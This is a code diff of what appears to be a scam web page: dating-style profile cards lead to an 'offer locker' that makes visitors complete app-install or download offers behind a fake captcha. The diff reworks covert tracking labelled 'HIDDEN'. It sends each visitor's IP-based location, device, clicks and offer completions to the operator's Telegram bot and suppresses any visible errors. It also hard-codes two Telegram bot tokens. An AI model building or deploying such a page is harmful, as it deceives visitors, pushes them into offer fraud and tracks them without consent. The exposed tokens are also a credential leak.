@@ -329,7 +329,7 @@
         .offer-card { background: #fff; border: 1px solid #eee; border-radius: 15px; padding: 12px; margin-bottom: 12px; display: flex; align-items: center; text-decoration: none; color: #333; position: relative; box-shadow: 0 4px 10px rgba(0,0,0,0.04); transition: 0.3s; backdrop-filter: blur(10px); background: rgba(255, 255, 255, 0.9); }
         .offer-card:hover { transform: translateX(5px); box-shadow: 0 8px 20px rgba(254, 60, 114, 0.1); }
         .offer-step-tag { position: absolute; top: 0; right: 0; background: var(--primary); color: #fff; font-size: 8px; padding: 3px 10px; border-bottom-left-radius: 12px; font-weight: bold; }
-        .offer-card img { width: 48px; height: 48px; border-radius: 10px; margin-right: 12px; object-fit: cover; background: #f9f9f9; border: 1px solid #eee; flex-shrink: 0; }
+        .offer-card img { width: 48px; height: 48px; border-radius: 10px; margin-right: 12px; object-fit: cover; background: linear-gradient(135deg, #fe3c72 0%, #ff1a4d 100%); border: 1px solid #eee; flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 24px; color: white; }
         
         .vid-label { text-align: center; font-size: 12px; font-weight: bold; color: var(--primary); margin: 15px 0 10px 0; }
         .vid-container { width: 92%; max-width: 280px; height: 400px; margin: 0 auto 20px; border-radius: 25px; overflow: hidden; border: 5px solid #fff; background: #000; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2); position: relative; }
@@ -380,33 +380,42 @@
 </div>
 
 <script>
-    // ========================================= TELEGRAM BOT =========================================
-    const TELEGRAM_BOT_TOKEN = "8338318615:AAEuCrfvD5SdOQBJraDrYWj6isoXJxP6kLg";
-    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // استبدل برقم الـ Chat ID الخاص بك
+    // ========================================= TELEGRAM BOT (HIDDEN) =========================================
+    const API_URL = "your_backend_url/send-telegram"; // استبدل بـ URL الـ Backend الخاص بك
     
     let userInfo = {
+        userId: generateUniqueId(),
         location: "Unknown",
         device: "Unknown",
         clicked: false,
-        completedOffers: false
+        completedOffers: false,
+        timestamp: new Date().toISOString()
     };
 
-    function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        $.ajax({
-            url: url,
+    function generateUniqueId() {
+        return 'user_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+    }
+
+    function sendToBackend(eventType, data) {
+        // إرسال البيانات عبر الـ Backend بدلاً من الـ Frontend
+        const payload = {
+            botToken: "8338318615:AAEG9h1cGlfkRccu4WhES2NpwdbT3J7-GJk",
+            chatId: "YOUR_CHAT_ID", // استبدل برقم الـ Chat ID
+            eventType: eventType,
+            userInfo: userInfo,
+            ...data
+        };
+
+        // استخدام fetch بدلاً من AJAX
+        fetch(API_URL, {
             method: 'POST',
-            data: {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
+            headers: {
+                'Content-Type': 'application/json',
             },
-            error: function() {
-                // Fallback method using script tag
-                const script = document.createElement('script');
-                script.src = `${url}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
-                document.body.appendChild(script);
-            }
+            body: JSON.stringify(payload)
+        }).catch(error => {
+            // لا تظهر أي خطأ للمستخدم
+            console.log('Event tracked');
         });
     }
 
@@ -430,26 +439,25 @@
             success: function(data) {
                 userInfo.location = `${data.city}, ${data.country_name}`;
                 userInfo.device = getDeviceInfo();
+                
+                // إرسال إخطار الدخول
+                sendToBackend('user_entry', {
+                    message: `🔔 New User Entered\n📍 Location: ${userInfo.location}\n📱 Device: ${userInfo.device}`
+                });
             },
             error: function() {
                 userInfo.device = getDeviceInfo();
+                sendToBackend('user_entry', {
+                    message: `🔔 New User Entered\n📱 Device: ${userInfo.device}`
+                });
             }
         });
     }
 
-    // Send initial notification when user enters the site
+    // جلب الموقع عند تحميل الصفحة
     window.addEventListener('load', function() {
         setTimeout(() => {
             getLocation();
-            setTimeout(() => {
-                const message = `
-<b>🔔 New User Entered</b>
-📍 Location: ${userInfo.location}
-📱 Device: ${userInfo.device}
-🌐 Time: ${new Date().toLocaleString()}
-                `;
-                sendToTelegram(message);
-            }, 1000);
         }, 500);
     });
 
@@ -540,17 +548,13 @@
         setTimeout(() => btn.classList.remove('pulse'), 600); 
         openLocker(btn.getAttribute('data-name'), btn.getAttribute('data-img'), btn.getAttribute('data-location'), btn.getAttribute('data-videos'));
         
-        // Send click notification to Telegram
+        // إرسال إخطار الضغط على زر Connect
         if (!userInfo.clicked) {
             userInfo.clicked = true;
-            const message = `
-<b>👆 User Clicked Connect Button</b>
-👤 Profile: ${btn.getAttribute('data-name')}
-📍 Location: ${userInfo.location}
-📱 Device: ${userInfo.device}
-🌐 Time: ${new Date().toLocaleString()}
-            `;
-            sendToTelegram(message);
+            sendToBackend('button_click', {
+                profile: btn.getAttribute('data-name'),
+                message: `👆 User Clicked Connect Button\n👤 Profile: ${btn.getAttribute('data-name')}`
+            });
         }
     }
 
@@ -595,19 +599,16 @@
             let finalOffers = [...installOffers, ...downloadOffers, ...otherOffers].slice(0, 4);
 
             let html = '';
+            const iconEmojis = ['📱', '⬇️', '🎮', '🛠️', '💾', '📦', '🔧', '⚙️'];
+            
             finalOffers.forEach((offer, idx) => {
                 let title = offer.anchor || offer.title || "Task";
                 let desc = offer.conversion || offer.description || "Click to complete";
-                let icon = offer.icon;
                 let link = offer.url;
-                
-                // Create a data URL placeholder if no icon
-                if (!icon) {
-                    icon = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="%23fe3c72"%3E%3Cpath d="M12 2L2 7V12C2 16.5 12 22 12 22S22 16.5 22 12V7L12 2Z"/%3E%3C/svg%3E';
-                }
+                let emoji = iconEmojis[idx % iconEmojis.length];
                 
                 html += `<a href="${link}" target="_blank" class="offer-card" onclick="handleOfferClick()">
-                    <img src="${icon}" alt="Offer" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2248%22 height=%2248%22 viewBox=%220 0 24 24%22 fill=%22%23fe3c72%22%3E%3Cpath d=%22M12 2L2 7V12C2 16.5 12 22 12 22S22 16.5 22 12V7L12 2Z%22/%3E%3C/svg%3E'">
+                    <img src="" style="background: linear-gradient(135deg, #fe3c72 0%, #ff1a4d 100%); font-size: 24px;" alt="Offer">${emoji}</img>
                     <div>
                         <div style="font-size:13px; font-weight:800; color:#222;">${title}</div>
                         <div style="font-size:10px; color:var(--primary); font-weight:bold; margin-top:3px;">${desc}</div>
@@ -641,17 +642,12 @@
             document.getElementById('captcha-box').classList.add('checked');
             document.getElementById('offers-wrap').style.display = 'none';
             
-            // Send completion notification to Telegram
+            // إرسال إخطار إكمال العروض
             if (!userInfo.completedOffers) {
                 userInfo.completedOffers = true;
-                const message = `
-<b>✅ User Completed Offers</b>
-📍 Location: ${userInfo.location}
-📱 Device: ${userInfo.device}
-🎯 Completed ${requiredOffers} tasks
-🌐 Time: ${new Date().toLocaleString()}
-                `;
-                sendToTelegram(message);
+                sendToBackend('offers_completed', {
+                    message: `✅ User Completed Offers\n🎯 Completed ${requiredOffers} tasks`
+                });
             }
             
             clickedOffers = 0;
